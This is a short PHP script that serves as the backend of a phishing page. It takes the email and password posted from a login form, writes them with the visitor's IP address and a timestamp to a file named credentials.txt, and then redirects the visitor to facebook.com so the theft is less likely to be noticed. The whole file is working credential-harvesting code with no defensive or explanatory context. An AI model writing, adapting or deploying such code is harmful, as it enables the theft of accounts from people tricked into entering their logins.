<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $email = $_POST['email'] ?? 'N/A';
    $password = $_POST['password'] ?? 'N/A';
    $ip = $_SERVER['REMOTE_ADDR'];
    $timestamp = date("Y-m-d H:i:s");

    $log = "[$timestamp] IP: $ip | Email: $email | Password: $password\n";

    file_put_contents("credentials.txt", $log, FILE_APPEND);
}

header("Location: https://www.facebook.com");
exit;
?>